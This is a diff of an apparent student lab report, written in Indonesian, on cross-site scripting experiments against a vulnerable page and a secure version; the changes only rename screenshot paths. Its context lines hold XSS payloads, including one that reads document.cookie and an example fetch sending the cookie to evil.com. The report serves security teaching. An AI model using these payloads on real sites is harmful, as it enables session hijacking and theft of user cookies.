@@ -4,13 +4,13 @@
 `<script>alert('XSS!')</script>` \
 Browser alert berisi "XSS!" muncul. \
 <br />
-![eksperimen1](screenshots/Eksperimen%201/1.png)
+![eksperimen1](screenshots/Experiment%201/1.png)
 
 ## EXPERIMENT 2: Image Tag XSS
 `<img src="x" onerror="alert('XSS via img!')">` \
 Browser alert berisi "XSS via img!" muncul. \
 <br />
-![eksperimen2](screenshots/Eksperimen%202/2.png) \
+![eksperimen2](screenshots/Experiment%202/2.png) \
 <br />
 HTML memiliki event hook bawaan yang secara implisit mengeksekusi JavaScript. \
 `onerror`, `onclick`, `onload`, dan sebagainya adalah titik eksekusi JavaScript.
@@ -19,22 +19,22 @@ HTML memiliki event hook bawaan yang secara implisit mengeksekusi JavaScript. \
 `<img src="x" onerror="alert('Cookie: ' + document.cookie)">` \
 Browser akan memunculkan cookie user di alert. \
 <br />
-![eksperimen3](screenshots/Eksperimen%203/3.png) \
+![eksperimen3](screenshots/Experiment%203/3.png) \
 <br />
 Jika `alert()` diganti dengan `fetch('https://evil.com?cookie=' + document.cookie)`, akan muncul error. \
 <br />
-![eksperimen3a](screenshots/Eksperimen%203/3a.png)
+![eksperimen3a](screenshots/Experiment%203/3a.png)
 
 ## EXPERIMENT 4: DOM Manipulation
 `<img src="x" onerror="document.body.style.background='red'">` \
 Halaman background akan berubah menjadi warna merah. \
 <br />
-![eksperimen4](screenshots/Eksperimen%204/4.png)
+![eksperimen4](screenshots/Experiment%204/4.png)
 
 ## EXPERIMENT 5: Versi Secure
 Semua payload yang dijalankan dari keempat eksperimen sebelumnya tidak berfungsi. (Aman dari XSS!) \
 <br />
-![eksperimen5](screenshots/Eksperimen%205/5.png)
+![eksperimen5](screenshots/Experiment%205/5.png)
 
 ## EXPERIMENT 6: Bandingkan Kode
 Memperhatikan perbedaan kode antara vulnerable dan secure:
